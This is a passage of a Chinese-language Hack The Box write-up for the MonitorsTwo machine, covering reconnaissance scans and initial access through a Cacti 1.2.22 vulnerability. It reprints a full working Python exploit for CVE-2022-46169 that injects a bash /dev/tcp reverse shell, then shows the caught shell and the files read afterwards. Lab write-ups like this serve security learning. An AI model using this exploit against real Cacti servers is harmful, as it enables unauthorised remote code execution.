<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  MonitorsTwo | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  MonitorsTwo</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-18T11:39:47.216Z" id="date"> 2023-07-18</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-18T13:10:37.482Z" id="updated"> 2023-07-18</time></div></span><br><span>Word Count: <div class="control">4.7k</div></span><br><span>Read Time: <div class="control">24 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/lika.jpg'><img src="/pic/lika.jpg" alt="lika"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><del>六花可爱捏。</del>挺简单的一台靶机，适合新手入坑尝试。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.211<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:44 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.211<br>Host is up (0.092s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.69 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.211<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:45 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.211<br>Host is up (0.075s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)<br>|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)<br>|_  256 18:<span class="hljs-built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Login to Cacti<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.50 seconds<br><br>$ sudo nmap --script=vuln 10.10.11.211<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:45 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.211<br>Host is up (0.078s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-sql-injection:<br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://10.10.11.211:80/include/js/dygraph-combined.js?b5b448f71f8c3eb4a39506299bd81b0c=%27%20OR%20sqlspider<br>|     http://10.10.11.211:80/include/js/jquery.tablesorter.pager.js?8ca32d30195c98492cd028f582f07c8c=%27%20OR%20sqlspider<br>|     http://10.10.11.211:80/include/js/d3.js?62b21cab0960a061cb893852bfc74cfa=%27%20OR%20sqlspider<br>|_    http://10.10.11.211:80/include/js/billboard.js?9a354b4a145f51a33bd39f8e5f042a23=%27%20OR%20sqlspider<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum:</span><br><span class="hljs-string">|_  /docs/: Potentially interesting folder</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 241.70 seconds</span><br></code></pre></td></tr></table></figure>

<p>开了22和80，看标题80应该是Cacti登录页面，其他就是扫出了一个&#x2F;docs目录可以看一下，报的sql注入漏洞显然不太像，可以不用看。</p>
<h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo whatweb 10.10.11.211<br>http://10.10.11.211 [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.10.11.211], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]<br></code></pre></td></tr></table></figure>

<p>扫出来可以看出网站是基于php的，并且nginx版本也不是最新的，可能有漏洞但是可以利用的可能性较小，懒得试了。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nikto -h 10.10.11.211<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.211<br>+ Target Hostname:    10.10.11.211<br>+ Target Port:        80<br>+ Start Time:         2023-07-18 03:03:35 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: nginx/1.18.0 (Ubuntu)<br>+ /: Retrieved x-powered-by header: PHP/7.4.33.<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?<br>+ ///etc/hosts: The server install allows reading of any system file by adding an extra <span class="hljs-string">&#x27;/&#x27;</span> to the URL.<br>+ /install/install.php: Install file found.<br>+ /help.php: A <span class="hljs-built_in">help</span> file was found.<br>+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.<br>+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.<br>+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.<br>+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.<br>+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.<br>+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.<br>+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.<br>+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote <span class="hljs-built_in">command</span> execution.<br>+ /shell?<span class="hljs-built_in">cat</span>+/etc/hosts: A backdoor was identified.<br>+ /<span class="hljs-comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span><br>+ /README.md: Readme Found.<br>+ 8881 requests: 0 error(s) and 19 item(s) reported on remote host<br>+ End Time:           2023-07-18 03:16:07 (GMT-4) (752 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>nikto疑似扫出来不少后门或者文件包含啥的，实际上都用不了，接着往下走吧，没必要在这硬磕。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><p>那就先打开网页看一眼吧。</p>
<p class='item-img' data-src='/pic/assets/e4048ca2cf54ab8b6b60cd1ed0c6b328.png'><img src="/pic/assets/e4048ca2cf54ab8b6b60cd1ed0c6b328.png" alt="e4048ca2cf54ab8b6b60cd1ed0c6b328"></p>
<p>啥也没有，简简单单一个登录框，试了几个弱密码没有成功。</p>
<p>但是登录框底部告诉我们这是用版本号为1.2.22的Cacti搭建的。我们直接google一下看看这是个啥。在这个<a target="_blank" rel="noopener" href="https://www.linuxprobe.com/cacti-install-use.html">网页</a>上找到了相关资料。</p>
<p class='item-img' data-src='/pic/assets/Cacti.png'><img src="/pic/assets/Cacti.png" alt="Cacti"></p>
<blockquote>
<p>Cacti 在英文中的意思是仙人掌的意思，Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。它通过snmpget来获取数据，使用 RRDtool绘画图形，而且你完全可以不需要了解RRDtool复杂的参数。它提供了非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大完善。Cacti 的发展是基于让 RRDTool 使用者更方便使用该软件，除了基本的 Snmp 流量跟系统资讯监控外，Cacti 也可外挂 Scripts 及加上 Templates 来作出各式各样的监控图。</p>
<p>cacti是用php语言实现的一个软件，它的主要功能是用snmp服务获取数据，然后用rrdtool储存和更新数据，当用户需要查看数据的时候用rrdtool生成图表呈现给用户。因此，snmp和rrdtool是cacti的关键。Snmp关系着数据的收集，rrdtool关系着数据存储和图表的生成。</p>
</blockquote>
<p>我们大致有了一个了解，总之直接图穷匕见，搜一下cacti exploit。</p>
<h3 id="Cacti-RCE"><a href="#Cacti-RCE" class="headerlink" title="Cacti RCE"></a>Cacti RCE</h3><p>exp-db上就有一个Cacti-v1.2.22的RCE利用EXP，试了一下没利用成功。另请高就，在<a target="_blank" rel="noopener" href="https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit">github</a>上又找到一个能绕过登录并执行RCE的exp。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkVuln</span>():<br>    result = requests.get(vulnURL, headers=header)<br>    <span class="hljs-keyword">return</span> (result.text != <span class="hljs-string">&quot;FATAL: You are not authorized to use this service&quot;</span> <span class="hljs-keyword">and</span> result.status_code == <span class="hljs-number">200</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteForce</span>():<br>    <span class="hljs-comment"># brute force to find host id and local data id</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>            vulnIdURL = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;vulnURL&#125;</span>?action=polldata&amp;poller_id=1&amp;host_id=<span class="hljs-subst">&#123;i&#125;</span>&amp;local_data_ids[]=<span class="hljs-subst">&#123;j&#125;</span>&quot;</span><br>            result = requests.get(vulnIdURL, headers=header)<br>    <br>            <span class="hljs-keyword">if</span> result.text != <span class="hljs-string">&quot;[]&quot;</span>:<br>                <span class="hljs-comment"># print(result.text)</span><br>                rrdName = result.json()[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;rrd_name&quot;</span>]<br>                <span class="hljs-keyword">if</span> rrdName == <span class="hljs-string">&quot;polling_time&quot;</span> <span class="hljs-keyword">or</span> rrdName == <span class="hljs-string">&quot;uptime&quot;</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, i, j<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remoteCodeExecution</span>(<span class="hljs-params">payload, idHost, idLocal</span>):<br>    encodedPayload = urllib.parse.quote(payload)<br>    injectedURL = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;vulnURL&#125;</span>?action=polldata&amp;poller_id=;<span class="hljs-subst">&#123;encodedPayload&#125;</span>&amp;host_id=<span class="hljs-subst">&#123;idHost&#125;</span>&amp;local_data_ids[]=<span class="hljs-subst">&#123;idLocal&#125;</span>&quot;</span><br>    <br>    result = requests.get(injectedURL,headers=header)<br>    <span class="hljs-built_in">print</span>(result.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    targetURL = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter the target address (like &#x27;http://123.123.123.123:8080&#x27;)&quot;</span>)<br>    vulnURL = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;targetURL&#125;</span>/remote_agent.php&quot;</span><br>    <span class="hljs-comment"># X-Forwarded-For value should be something in the database of Cacti</span><br>    header = &#123;<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>&#125;<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking vulnerability...&quot;</span>)<br>    <span class="hljs-keyword">if</span> checkVuln():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;App is vulnerable&quot;</span>)<br>        isVuln, idHost, idLocal = bruteForce()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Brute forcing id...&quot;</span>)<br>        <span class="hljs-comment"># RCE payload</span><br>        ipAddress = <span class="hljs-string">&quot;192.168.1.15&quot;</span><br>        ipAddress = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter your IPv4 address&quot;</span>)<br>        port = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter the port you want to listen on&quot;</span>)<br>        payload = <span class="hljs-string">f&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">&#123;ipAddress&#125;</span>/<span class="hljs-subst">&#123;port&#125;</span> 0&gt;&amp;1&#x27;&quot;</span><br>        <span class="hljs-keyword">if</span> isVuln:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Delivering payload...&quot;</span>)<br>            remoteCodeExecution(payload, idHost, idLocal)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;RRD not found&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not vulnerable&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>直接跑一下试试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python exp.py<br>Enter the target address (like <span class="hljs-string">&#x27;http://123.123.123.123:8080&#x27;</span>)http://10.10.11.211<br>Checking vulnerability...<br>App is vulnerable<br>Brute forcing <span class="hljs-built_in">id</span>...<br>Enter your IPv4 address &lt;YOUR_IP&gt;<br>Enter the port you want to listen on &lt;YOUR_PORT&gt;<br>Delivering payload...<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;504 Gateway Time-out&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;center&gt;&lt;h1&gt;504 Gateway Time-out&lt;/h1&gt;&lt;/center&gt;<br>&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>本地nc监听一下就拿到shell了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ sudo nc -nlvp 443<br>listening on [any] 443 ...<br>connect to [HTB_IP] from (UNKNOWN) [10.10.11.211] 49612<br>bash: cannot set terminal process group (1): Inappropriate ioctl for device<br>bash: no job control in this shell<br>www-data@50bca5e748b0:/var/www/html$ <br></code></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="思路构建"><a href="#思路构建" class="headerlink" title="思路构建"></a>思路构建</h3><p>然而还不能高兴太早。高高兴兴跑去home目录下找user flag就会发现home目录是空的。我们直接看一下<code>/etc/passwd</code>就会发现除了root没人有bash环境以及home目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/home$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br></code></pre></td></tr></table></figure>

<p>为啥呢？其实看一下主机名称一段无意义字符串+没有其他用户我们不难猜出其实我们处于docker环境中。我们的反弹shell是利用Cacti的漏洞获取的，如果Cacti是部署在docker上 的，那么我们的shell是从docker反弹出来的就是自然而然的了。</p>
<p>那我们此时的shell毫无意义了吗？并不是，我们知道，网站部署起来要和后端交互，数据一般来说是要保存在数据库中的。并且我们的网页还是个登录页面，数据库里肯定存有用户的登录凭证，如果存在凭证复用的情况，那我们要拿到外面的shell也就有了路径。</p>
<h3 id="拿到user权限"><a href="#拿到user权限" class="headerlink" title="拿到user权限"></a>拿到user权限</h3><p>思路已经构建，那我们接下来就执行。要找数据库怎么找？当然是直接去看网页的配置文件了。我们查一下就能发现cacti的网站配置文件在<code>/include/config.php</code>中，那我们直接进行一个文件的看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@50bca5e748b0:/var/www/html/include$ <span class="hljs-built_in">cat</span> config.php<br><span class="hljs-built_in">cat</span> config.php<br>&lt;?php<br>/*<br> +-------------------------------------------------------------------------+<br> | Copyright (C) 2004-2020 The Cacti Group                                 |<br> |                                                                         |<br> | This program is free software; you can redistribute it and/or           |<br> | modify it under the terms of the GNU General Public License             |<br> | as published by the Free Software Foundation; either version 2          |<br> | of the License, or (at your option) any later version.                  |<br> |                                                                         |<br> | This program is distributed <span class="hljs-keyword">in</span> the hope that it will be useful,         |<br> | but WITHOUT ANY WARRANTY; without even the implied warranty of          |<br> | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |<br> | GNU General Public License <span class="hljs-keyword">for</span> more details.                            |<br> +-------------------------------------------------------------------------+<br> | Cacti: The Complete RRDtool-based Graphing Solution                     |<br> +-------------------------------------------------------------------------+<br> | This code is designed, written, and maintained by the Cacti Group. See  |<br> | about.php and/or the AUTHORS file <span class="hljs-keyword">for</span> specific developer information.   |<br> +-------------------------------------------------------------------------+<br> | http://www.cacti.net/                                                   |<br> +-------------------------------------------------------------------------+<br>*/<br><br>/*<br> * Make sure these values reflect your actual database/host/user/password<br> */<br><br><span class="hljs-variable">$database_type</span>     = <span 